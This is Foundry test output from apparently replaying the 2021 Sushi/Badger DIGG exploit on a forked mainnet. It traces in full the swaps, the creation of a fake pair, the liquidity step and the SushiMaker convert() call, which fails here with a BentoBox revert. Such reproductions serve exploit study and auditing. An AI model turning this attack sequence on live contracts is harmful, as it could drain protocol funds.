Compiling 27 files with Solc 0.8.25
Solc 0.8.25 finished in 1.24s
Compiler run successful!

Ran 1 test for script/Exploit-template_new.sol:ExploitScript
[PASS] testExploit() (gas: 20485)
Logs:
  Attacker ETH Balance Before exploit: 0.000000000000000000
  Attacker ETH Balance After exploit: 0.000000000000000000

Traces:
  [20485] ExploitScript::testExploit()
    ├─ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    │   └─ ← [Return] 
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 268.11ms (103.54µs CPU time)

Ran 1 test for src/test/2021-01/Sushi_Badger_Digg_exp.sol:Exploit
[FAIL. Reason: revert: BentoBox: Transfer failed] testHack() (gas: 1040507559)
Traces:
  [1040507559] Exploit::testHack()
    ├─ [0] VM::createSelectFork("mainnet", 11720049 [1.172e7])
    │   └─ ← [Return] 0
    ├─ [23974] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::deposit{value: 1000000000000000}()
    │   ├─ emit Deposit(param0: Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 1000000000000000 [1e15])
    │   └─ ← [Stop] 
    ├─ [24420] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::approve(0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F, 1000000000000000 [1e15])
    │   ├─ emit Approval(owner: Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F, value: 1000000000000000 [1e15])
    │   └─ ← [Return] true
    ├─ [160612] 0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F::swapExactTokensForTokens(500000000000000 [5e14], 0, [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599, 0x798D1bE841a82a273720CE31c822C61a67a601C3], Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   ├─ [2517] 0xCEfF51756c56CeFFCA006cD410B03FFC46dd3a58::getReserves() [staticcall]
    │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000bcdc7b06ef0000000000000000000000000000000000000000000028829ff2ddbe9ec1ad8c00000000000000000000000000000000000000000000000000000000600dc033
    │   ├─ [2517] 0x9a13867048e01c663ce8Ce2fE0cDAE69Ff9F35E3::getReserves() [staticcall]
    │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000059b815c0500000000000000000000000000000000000000000000000000000016dd76350200000000000000000000000000000000000000000000000000000000600dbfe0
    │   ├─ [8948] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::transferFrom(Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xCEfF51756c56CeFFCA006cD410B03FFC46dd3a58, 500000000000000 [5e14])
    │   │   ├─ emit Transfer(from: Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xCEfF51756c56CeFFCA006cD410B03FFC46dd3a58, value: 500000000000000 [5e14])
    │   │   └─ ← [Return] true
    │   ├─ [51228] 0xCEfF51756c56CeFFCA006cD410B03FFC46dd3a58::swap(2113, 0, 0x9a13867048e01c663ce8Ce2fE0cDAE69Ff9F35E3, 0x)
    │   │   ├─ [15703] 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599::transfer(0x9a13867048e01c663ce8Ce2fE0cDAE69Ff9F35E3, 2113)
    │   │   │   ├─ emit Transfer(from: 0xCEfF51756c56CeFFCA006cD410B03FFC46dd3a58, to: 0x9a13867048e01c663ce8Ce2fE0cDAE69Ff9F35E3, value: 2113)
    │   │   │   └─ ← [Return] true
    │   │   ├─ [795] 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599::balanceOf(0xCEfF51756c56CeFFCA006cD410B03FFC46dd3a58) [staticcall]
    │   │   │   └─ ← [Return] 811152899758 [8.111e11]
    │   │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(0xCEfF51756c56CeFFCA006cD410B03FFC46dd3a58) [staticcall]
    │   │   │   └─ ← [Return] 191304262062575221796236 [1.913e23]
    │   │   ├─ emit Sync(: 811152899758 [8.111e11], : 191304262062575221796236 [1.913e23])
    │   │   ├─ emit Swap(param0: 0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F, param1: 0, param2: 500000000000000 [5e14], param3: 2113, param4: 0, param5: 0x9a13867048e01c663ce8Ce2fE0cDAE69Ff9F35E3)
    │   │   └─ ← [Stop] 
    │   ├─ [76695] 0x9a13867048e01c663ce8Ce2fE0cDAE69Ff9F35E3::swap(0, 8590, Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
    │   │   ├─ [39969] 0x798D1bE841a82a273720CE31c822C61a67a601C3::transfer(Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 8590)
    │   │   │   ├─ [32690] 0xFaBec03B04279c6E73F27AaF25866ACc844448Ae::transfer(Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 8590) [delegatecall]
    │   │   │   │   ├─ emit Transfer(from: 0x9a13867048e01c663ce8Ce2fE0cDAE69Ff9F35E3, to: Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 8590)
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Return] true
    │   │   ├─ [795] 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599::balanceOf(0x9a13867048e01c663ce8Ce2fE0cDAE69Ff9F35E3) [staticcall]
    │   │   │   └─ ← [Return] 24083784774 [2.408e10]
    │   │   ├─ [1735] 0x798D1bE841a82a273720CE31c822C61a67a601C3::balanceOf(0x9a13867048e01c663ce8Ce2fE0cDAE69Ff9F35E3) [staticcall]
    │   │   │   ├─ [959] 0xFaBec03B04279c6E73F27AaF25866ACc844448Ae::balanceOf(0x9a13867048e01c663ce8Ce2fE0cDAE69Ff9F35E3) [delegatecall]
    │   │   │   │   └─ ← [Return] 98204783476 [9.82e10]
    │   │   │   └─ ← [Return] 98204783476 [9.82e10]
    │   │   ├─ emit Sync(: 24083784774 [2.408e10], : 98204783476 [9.82e10])
    │   │   ├─ emit Swap(param0: 0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F, param1: 2113, param2: 0, param3: 0, param4: 8590, param5: Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   │   └─ ← [Stop] 
    │   └─ ← [Return] [500000000000000 [5e14], 2113, 8590]
    ├─ [2040362] 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac::createPair(0x798D1bE841a82a273720CE31c822C61a67a601C3, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2)
    │   ├─ [1884378] → new <unknown>@0xf41E354EB138B328d56957B36B7F814826708724
    │   │   └─ ← [Return] 9079 bytes of code
    │   ├─ [44728] 0xf41E354EB138B328d56957B36B7F814826708724::initialize(0x798D1bE841a82a273720CE31c822C61a67a601C3, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2)
    │   │   └─ ← [Stop] 
    │   ├─  emit topic 0: 0x0d3648bd0f6ba80134a33ba9275ac585d9d315f0ad8355cddefde31afa28d0e9
    │   │        topic 1: 0x000000000000000000000000798d1be841a82a273720ce31c822c61a67a601c3
    │   │        topic 2: 0x000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2
    │   │           data: 0x000000000000000000000000f41e354eb138b328d56957b36b7f814826708724000000000000000000000000000000000000000000000000000000000000027c
    │   └─ ← [Return] 0xf41E354EB138B328d56957B36B7F814826708724
    ├─ [25232] 0x798D1bE841a82a273720CE31c822C61a67a601C3::approve(0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F, 8590)
    │   ├─ [24453] 0xFaBec03B04279c6E73F27AaF25866ACc844448Ae::approve(0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F, 8590) [delegatecall]
    │   │   ├─ emit Approval(owner: Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F, value: 8590)
    │   │   └─ ← [Return] true
    │   └─ ← [Return] true
    ├─ [214067] 0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F::addLiquidity(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, 0x798D1bE841a82a273720CE31c822C61a67a601C3, 500000000000000 [5e14], 8590, 0, 0, Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   ├─ [644] 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac::getPair(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, 0x798D1bE841a82a273720CE31c822C61a67a601C3) [staticcall]
    │   │   └─ ← [Return] 0x000000000000000000000000f41e354eb138b328d56957b36b7f814826708724
    │   ├─ [2517] 0xf41E354EB138B328d56957B36B7F814826708724::getReserves() [staticcall]
    │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    │   ├─ [26048] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::transferFrom(Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xf41E354EB138B328d56957B36B7F814826708724, 500000000000000 [5e14])
    │   │   ├─ emit Transfer(from: Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xf41E354EB138B328d56957B36B7F814826708724, value: 500000000000000 [5e14])
    │   │   └─ ← [Return] true
    │   ├─ [27047] 0x798D1bE841a82a273720CE31c822C61a67a601C3::transferFrom(Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xf41E354EB138B328d56957B36B7F814826708724, 8590)
    │   │   ├─ [26262] 0xFaBec03B04279c6E73F27AaF25866ACc844448Ae::transferFrom(Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xf41E354EB138B328d56957B36B7F814826708724, 8590) [delegatecall]
    │   │   │   ├─ emit Transfer(from: Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xf41E354EB138B328d56957B36B7F814826708724, value: 8590)
    │   │   │   └─ ← [Return] true
    │   │   └─ ← [Return] true
    │   ├─ [151615] 0xf41E354EB138B328d56957B36B7F814826708724::mint(Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   │   ├─ [1735] 0x798D1bE841a82a273720CE31c822C61a67a601C3::balanceOf(0xf41E354EB138B328d56957B36B7F814826708724) [staticcall]
    │   │   │   ├─ [959] 0xFaBec03B04279c6E73F27AaF25866ACc844448Ae::balanceOf(0xf41E354EB138B328d56957B36B7F814826708724) [delegatecall]
    │   │   │   │   └─ ← [Return] 8590
    │   │   │   └─ ← [Return] 8590
    │   │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(0xf41E354EB138B328d56957B36B7F814826708724) [staticcall]
    │   │   │   └─ ← [Return] 500000000000000 [5e14]
    │   │   ├─ [2338] 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac::feeTo() [staticcall]
    │   │   │   └─ ← [Return] 0x000000000000000000000000e11fc0b43ab98eb91e9836129d1ee7c3bc95df50
    │   │   ├─ [2337] 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac::migrator() [staticcall]
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x0000000000000000000000000000000000000000, value: 1000)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 2072437177 [2.072e9])
    │   │   ├─ emit Sync(: 8590, : 500000000000000 [5e14])
    │   │   ├─ emit Mint(param0: 0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F, param1: 8590, param2: 500000000000000 [5e14])
    │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000007b86e1b9
    │   └─ ← [Return] 500000000000000 [5e14], 8590, 2072437177 [2.072e9]
    ├─ [0] VM::prank(DefaultSender: [0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38])
    │   └─ ← [Return] 
    ├─ [1037989170] 0xE11fc0B43ab98Eb91e9836129d1ee7c3Bc95df50::convert(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599, 0x798D1bE841a82a273720CE31c822C61a67a601C3) [staticcall]
    │   ├─ [2644] 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac::getPair(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599, 0x798D1bE841a82a273720CE31c822C61a67a601C3) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000009a13867048e01c663ce8ce2fe0cdae69ff9f35e3
    │   ├─ [2492] 0x9a13867048e01c663ce8Ce2fE0cDAE69Ff9F35E3::balanceOf(0xE11fc0B43ab98Eb91e9836129d1ee7c3Bc95df50) [staticcall]
    │   │   └─ ← [Return] 528628937 [5.286e8]
    │   ├─ [717] 0x9a13867048e01c663ce8Ce2fE0cDAE69Ff9F35E3::transfer(0x9a13867048e01c663ce8Ce2fE0cDAE69Ff9F35E3, 528628937 [5.286e8])
    │   │   └─ ← [StateChangeDuringStaticCall] EvmError: StateChangeDuringStaticCall
    │   └─ ← [Revert] revert: BentoBox: Transfer failed
    └─ ← [Revert] revert: BentoBox: Transfer failed

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 309.62ms (309.37ms CPU time)

Ran 2 test suites in 616.19ms (577.73ms CPU time): 1 tests passed, 1 failed, 0 skipped (2 total tests)

Failing tests:
Encountered 1 failing test in src/test/2021-01/Sushi_Badger_Digg_exp.sol:Exploit
[FAIL. Reason: revert: BentoBox: Transfer failed] testHack() (gas: 1040507559)

Encountered a total of 1 failing tests, 1 tests succeeded
